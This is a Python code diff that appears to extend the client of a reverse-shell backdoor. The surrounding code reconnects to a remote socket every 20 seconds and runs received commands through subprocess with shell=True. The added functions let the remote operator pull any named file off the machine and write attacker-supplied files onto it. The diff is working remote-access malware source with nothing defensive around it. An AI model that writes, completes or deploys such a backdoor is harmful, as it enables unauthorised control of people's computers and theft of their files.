@@ -17,6 +17,23 @@ def reliable_recv():
         except ValueError:
             continue
 
+def upload_file(filename):
+      f = open(filename,'rb') #read the file
+      s.send(f.read())
+
+def download_file(filename):
+    f = open(filename,'wb') #write bytes 
+    s.settimeout(1) #avoid complicatations during download
+    chunk= s.recv(1024) #recieving bytes
+    while chunk:      #runs while theres something in the chunk variable 
+        f.write(chunk)
+        try:
+            chunk=s.recv(1024)
+        except socket.timeout as e:
+            break
+    s.settimeout(None)
+    f.close()
+
 def connection():
 	while True:
 		time.sleep(20)
@@ -36,6 +53,10 @@ def shell():
                   pass
             elif cmd[:3] =='cd ': #directory changing checking for first 3 characters
                   os.chdir(cmd[3:]) #from the 3rd character to the end 
+            elif cmd [:8] == 'download':
+                  upload_file(cmd[9:])
+            elif cmd[:6] == 'upload':
+                  download_file(cmd[7:])
                   
             else:
                   execute = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
